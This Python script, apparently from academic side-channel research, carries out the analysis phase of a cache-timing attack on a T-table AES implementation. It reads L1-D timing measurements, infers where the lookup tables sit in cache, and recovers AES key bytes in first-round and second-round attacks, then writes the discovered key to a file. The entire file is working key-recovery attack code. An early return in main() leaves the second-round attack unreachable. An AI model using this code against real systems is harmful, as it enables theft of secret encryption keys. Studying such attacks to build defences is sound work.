# Crypto.py

# Description:
#   Program that handles the crypto-analysis phase of the side-channel attack
#       1Round Attack - each key byte value is linked to a serie of timings from the lookups from the 0-th Round(lines w/ timing above avg+1dev are ignored)
#       2Round Attack - each group of key is linked to a serie of timings from the table lookups on the 1-st Round (lines w/ timing above avg+1dev are ignored)




# Imports
import math                  # To perform logarithmic calculations
import statistics as st      # To perform average and standard deviations operations
from pyfinite import ffield  # To perform GF(256) multiplications
from itertools import combinations  # To get combinations


# Global Variables


delta = 16                                                              # Max number of table elements in a L1-D cache block
s = [                                                                   # Sbox - 256 
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
        0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
        0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
        0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
        0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
        0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
        0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
        0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
        0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
        0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
        0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
        0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
        0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
        0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
        ]


# L1D T-box Mapping phase extension variables:
table_elem_dic = {}                                                 # dictionary that links table & element index to the respective L1 line that mapps it
t0e_line = 0                                                        # L1 line of beginning of enc. table 0 
offset_elem = 0                                                     # minimum offset - i.e.: the minimum element shift - example: shift of 14 in a L1 block means offset_elem = 2

# Round 1 Attack Variables:
first_candidate_k = []                                              # Lowest possible key byte value from 16 key bytes 

# Round 2 Attack Variables:
fk = [[] for x in range(16)]                                        # Array of the final keys extracted
line_value_threshold = 50                                           # Max value a line can take to be considered a used line



# Main Program
def main():

    table_offset_attack()
    print("L1-D Line of T0: ", t0e_line)
    print("Additional Offset: ", offset_elem)

    write_file([offset_elem, t0e_line], "tbox_discovered_.out")


    round_1_attack()
    print("First round key bits discovered: ", first_candidate_k)

    return 
    round_2_attack()
    print("Final key:", fk)


    write_file(fk, "discovered_key_.out")




# Implement table/offset attack
def table_offset_attack():
     
    global offset_elem
    global t0e_line

    p1_lines = [[0,0] for i in range(64)]
    p2_lines = [[0,0] for i in range(64)]
    diff_lines = [0 for i in range(64)]

    l = -1
    while(True):
        try:
            # Get timings from the current side-channel table file
            l+=1
            table_timings = read_table_file(l)
            
        except IOError:
            break

        # Get average and standard deviation values 
        avg = st.mean(table_timings)
        st_dev = st.stdev(table_timings)


        # Excluding timings higher than (1 st. dev + average) and averaging each line by type of plaintext
        for index, timing in enumerate(table_timings):

            if (timing > (avg + 1*st_dev)):
                continue

            if (l%2 == 0):
                p_lines = p1_lines

            if (l%2 == 1):
                p_lines = p2_lines

            weight_avg(p_lines, index, timing)
            

        



    # Build timings from the difference between the averaged plaintext p1 and p2 on p1_lines
    for i in range(len(p1_lines)):
        diff_lines[i] = int((p2_lines[i][0] - p1_lines[i][0]) / l)

    # Creating of sum - structure containg the scores of each group of 4 lines 16 lines apart
    sum = [0 for x in range(16)]
    for i in range(16):
        for j in range(4):
            sum[i] += diff_lines[i+j*16]



    # Debug section
    # print("p1")
    # for elem in p1_lines:
    #     print(int(elem[0]))
    # print("p2")
    # for elem in p2_lines:
    #     print(int(elem[0]))
    # print("diff")
    # for elem in diff_lines:
    #     print(int(elem))
    # print("sum")
    # for elem in sum:
    #     print(int(elem))
    # print('p1:', p1_lines)
    # print('p2:', p2_lines)
    # print('diff',diff_lines)



    # Get list containing all the indexes of items above 2 st dev
    # In a negative outcome it gets the indexes above 1 st dev
    sum_index_st = get_standard_deviation_elem(sum, 2 ,"above")
    if (len(sum_index_st) == 0):
        sum_index_st = get_standard_deviation_elem(sum, 1 ,"above")

    # If possible, get the tuple containing the 2 neighboor lines
    sum_index_tuple = get_neighboors(sum_index_st, len(sum))


    # Offset checking (0 or 32bit)
    offset_elem = 0
    set_i = sum.index(max(sum),0, len(sum))
    if (sum_index_tuple):
        offset_elem = 8
        set_i = sum_index_tuple[0]


    # Get L1 lines used by the beginning of each table
    set_lines = []
    for i in range(4):
        set_lines.append(diff_lines[set_i+i*16])
    

    # Get T0 L1 line ~ (and consequently T1,T2,T3)
    minn = min(set_lines)
    t3_line_index = [i for i, j in enumerate(set_lines) if j == minn]
    t0_line_index = (t3_line_index[0]+1)%4
    t0e_line = set_i + (t0_line_index*16)

    # Table element structure: (table index, element index) : L1 line
    #   Warning: It assumes all the tables are consequent in memory
    for t in range(4):
        for e in range(256):
            line = (t0e_line + ((offset_elem + e + 256*t)//delta)) %64 
            table_elem_dic[(t,e)] = line


    # Debug Section
    #print(table_indices_sorted)
    #print(table_scores)
    #print("first| second | offset ")
    # print(first, second, offset_elements)
    # print(table_elem_dic)
    # print("sum:", sum)
    # print("sum_index_st:", sum_index_st)
    # print("sum_index_tuple:", sum_index_tuple)
    # print("set_lines", set_lines)

def round_1_attack():


    # Local Variables
    hk_score = [[[0,0] for x in range(256)] for y in range(16)]             # Score structure per key byte value
    candidate_k = []                                                    # List of candidate key bytes per byte
    l=0                                                                 # Measurement file index


    while(True):
        try:
            p,timings  = read_files(l)
            l+=1
        except IOError:
            break


        # Get average and standard deviation values 
        avg = st.mean(timings)
        st_dev = st.stdev(timings)


        # For each meas. iteration each hip. key byte gets updated with a new score (nº of clock cycles)
        for bi, byte in enumerate (hk_score):
            for hki in range(len(byte)):
                hx = p[bi] ^ hki   
                hline = table_elem_dic[(bi%4,hx)]
                if (timings[hline] < (avg + 1*st_dev)):
                    weight_avg(byte, hki, timings[hline] )


    # Retrieve the remaining combinations from lk[]
    max = 0
    key_value = 0
    lk_list = []
    for byte, key_byte in enumerate(hk_score):
        for value, key in enumerate (key_byte):
            
            if(key[0] > max):
                max = key[0]
                key_value = value

        first_candidate_k.append(key_value)




def round_2_attack():


    # Local Variables
    F = ffield.FField(8)                                                # Galouis Field(256)
    hx = [x for x in range(4)]                                          # Hipotetical index
    hk = [0 for x in range(16)]                                         # Hipotetical key
    n_comb = 16 - offset_elem                                           # number of possible combinations of each key byte | e.g: 0->16 | 8->8 | 12->4 | 14->2
    n_bits = int(math.log2(n_comb))                                     # number of bits from each key byte that remain unknown
    lk = [[[0,0] for x in range(n_comb**4)] for y in range(4)]          # Structure containing all the combinations from the 4 equations
    l=0                                                                 # Measurement file index

    
    while(True):
        try:
            p,timings  = read_files(l)
            l+=1
        except IOError:
            break

        # Get average and standard deviation values 
        avg = st.mean(timings)
        st_dev = st.stdev(timings)
        
        # Generates every single combination for the 4 key groups fo the unknown part of the key
        for low_hkA in range(0, (n_comb)):
            for low_hkB in range(0, (n_comb)):
                for low_hkC in range(0, (n_comb)):
                    for low_hkD in range(0, (n_comb)):
                        hk[0] =  (first_candidate_k[0] + low_hkA)
                        hk[1] =  (first_candidate_k[1] + low_hkB)
                        hk[2] =  (first_candidate_k[2] + low_hkC)
                        hk[3] =  (first_candidate_k[3] + low_hkD)
                        hk[4] =  (first_candidate_k[4] + low_hkA)
                        hk[5] =  (first_candidate_k[5] + low_hkB)
                        hk[6] =  (first_candidate_k[6] + low_hkC)
                        hk[7] =  (first_candidate_k[7] + low_hkD)
                        hk[8] =  (first_candidate_k[8] + low_hkA)
                        hk[9] =  (first_candidate_k[9] + low_hkB)
                        hk[10] = (first_candidate_k[10] + low_hkC)
                        hk[11] = (first_candidate_k[11] + low_hkD)
                        hk[12] = (first_candidate_k[12] + low_hkA)
                        hk[13] = (first_candidate_k[13] + low_hkB)
                        hk[14] = (first_candidate_k[14] + low_hkC)
                        hk[15] = (first_candidate_k[15] + low_hkD)

                        hx[0] = s[p[0] ^ hk[0]] ^ s[p[5] ^ hk[5]] ^ F.Multiply(2, s[p[10]^hk[10]]) ^ F.Multiply(3, s[p[15]^hk[15]]) ^ s[hk[15]] ^ first_candidate_k[2]
                        hx[1] = s[p[4] ^ hk[4]] ^ F.Multiply(2,s[p[9] ^ hk[9]]) ^ F.Multiply(3, s[p[14]^hk[14]]) ^ s[p[3]^hk[3]] ^ s[hk[14]] ^ first_candidate_k[1] ^ first_candidate_k[5]
                        hx[2] = F.Multiply(2,s[p[8] ^ hk[8]]) ^ F.Multiply(3,s[p[13] ^ hk[13]]) ^ s[p[2]^hk[2]] ^ s[p[7]^hk[7]] ^ s[hk[13]] ^ first_candidate_k[0] ^ first_candidate_k[4] ^ first_candidate_k[8] ^ 1
                        hx[3] = F.Multiply(3,s[p[12] ^ hk[12]]) ^ s[p[1]^hk[1]] ^ s[p[6]^hk[6]] ^ F.Multiply(2, s[p[11]^hk[11]]) ^ s[hk[12]] ^ first_candidate_k[3] ^ first_candidate_k[7] ^ first_candidate_k[11] ^ first_candidate_k[15]
     

                        # Get an hipotetical combination, to get resp. hip. line, to get resp. hip. timing, to be weightened on combination score 
                        comb_index = (low_hkA<<(n_bits*3)) + (low_hkB<<(n_bits*2)) + (low_hkC<<(n_bits*1)) + low_hkD
                        for i in range(0,4):
                            hline = table_elem_dic[((2-i)%4, hx[i])]

                            if (timings[hline] < (avg + 1*st_dev)):
                                weight_avg(lk[i], comb_index, timings[hline])

    # Retrieve the remaining combinations from lk[]
    max = 0
    max_index = 0
    lk_list = []
    for lk_index, lk_item in enumerate(lk):
        for comb_index, comb in enumerate (lk_item):
            
            if(comb[0] > max):
                max = comb[0]
                max_index = comb_index

        lk_list.append(max_index)

    # Registering discovered key bytes
    set_final_key(fk, lk_list, n_comb, n_bits)
        


# Auxiliar Functions


# Write in file file_name each element of fk list
def write_file(fk, file_name):

    with open(file_name, 'w') as f:
        for key in fk:
            f.write(str(key) + '\n')


# Registers the discovered keys bytes values by the attack
def set_final_key(fk, lk_list, n_comb, n_bits):

    for i, item in enumerate(lk_list):
        for j in range(0,4):
            key_byte = first_candidate_k[(i*4+j*5) %16] + (item>>((3-j)*n_bits) & (n_comb-1))
            # if key_byte not in fk[(i*4+j*5)%16]:
            fk[(i*4+j*5)%16] = key_byte
    


# Variable receives a value and updates the respective average value
def weight_avg(avg_struct, index, timing):

    old_freq = avg_struct[index][1]
    old_timing = avg_struct[index][0]
    avg_struct[index][1] += 1
    new_freq = avg_struct[index][1]
    avg_struct[index][0] = (old_freq/new_freq) * old_timing + (1/new_freq) * timing

# Get the content of meas, victim files
def read_files(l):
    meas_file = open("side_channel_info/meas#" + str(l) + ".out", "r")
    plaintext_raw = meas_file.readline()
    plaintext_raw = plaintext_raw[:-2]
    plaintext = [int(i) for i in plaintext_raw.split('.')]
    scores = [int(i) for i in meas_file]
    meas_file.close()
    
    return plaintext, scores


# Get the content of meas, victim files
def read_table_file(l):
    table_file = open("side_channel_info/table#" + str(l) + ".out", "r")
    timings = [int(i) for i in table_file]
    table_file.close()
    return timings



# Checks whether a list contains all the elements positive or not
def is_above_avg(avg, lst):
    for item in lst:
        if (item < avg):
            return False
    return True
    



# Get the consecutive lines
def get_neighboors(index_list, list_len):
    index_list_tuples = list(combinations(index_list,2))
    for item in index_list_tuples:
        if (((item[0] + 1) %list_len ==item[1]) or ((item[1] + 1) %list_len == item[0])):
            return item
    return False



# Get index of elements below/ above a certain limit
def get_standard_deviation_elem(list_elem, num_stand_dev, direction):

    avg = st.mean(list_elem)
    dev = st.stdev(list_elem)
    limit =  int(avg+num_stand_dev*dev)

    if (direction == "below"):
        return [index for index,elem in enumerate (list_elem) if elem <= limit]

    elif (direction == "above"):
        return [index for index,elem in enumerate (list_elem) if elem >= limit]

    else:
        print("An error occured on get_standard_deviation_elem")



# Program execution
main()